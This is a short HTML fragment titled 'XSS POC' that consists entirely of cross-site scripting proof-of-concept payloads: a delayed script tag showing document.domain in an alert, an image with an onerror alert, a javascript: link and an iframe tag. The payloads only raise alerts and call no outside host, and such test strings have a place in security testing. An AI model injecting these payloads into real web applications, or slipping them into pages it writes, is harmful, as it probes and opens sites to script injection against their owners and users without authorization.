XSS POC<script>function show(){alert(document.domain);}setTimeout(show, 3000);</script>
<img src="x" onerror="alert(1)">
<a href="javascript:alert(1);">ccc</a>
<iframe src="zzz">
